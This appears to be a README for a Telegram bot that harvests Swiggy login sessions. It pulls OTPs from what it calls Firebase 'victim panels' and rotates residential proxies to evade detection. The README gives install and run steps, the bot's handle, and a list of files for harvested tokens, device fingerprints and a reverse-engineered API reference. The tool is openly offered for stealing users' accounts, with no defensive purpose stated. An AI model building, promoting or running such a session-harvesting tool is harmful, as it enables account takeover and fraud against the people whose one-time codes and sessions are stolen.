# Swiggy Auto Login & Session Harvester (Telegram Bot)

Automated Swiggy OTP extraction and session harvesting bot using Firebase Realtime Database victim panels and rotating residential proxies.

## Quick Start

1. Install requirements:
   ```bash
   pip3 install -r requirements.txt
   ```

2. Run the bot:
   ```bash
   ./run_bot.sh
   # or
   python3 swiggy_bot.py
   ```

3. Open Telegram and message your bot (`@Zwiggy_extract_bot`):
   - Send `/start`
   - Tap **▶️ Start Scan** to begin scanning panels and harvesting sessions automatically.

---

## Files Overview

| File | Purpose |
|------|---------|
| `swiggy_bot.py` | Main Telegram Bot & automated scanner worker |
| `run_bot.sh` | Shell launcher shortcut |
| `panels.txt` | Firebase Realtime Database panel URLs |
| `proxies.txt` | Residential rotating proxies (HTTP & SOCKS5H supported) |
| `sessions.json` | Full harvested session tokens and device fingerprints |
| `sessions_minimal.json` | Clean mobile, token, sid, tid and customerId list |
| `swiggy_store.json` | Persistent bot store (used numbers, worker settings) |
| `manual_login_cli.py` | Terminal interactive manual login tool |
| `test_proxy.py` | Standalone proxy testing script |
| `SWIGGY_APIS.txt` | Reverse-engineered Swiggy API reference |

# ziggy_clone
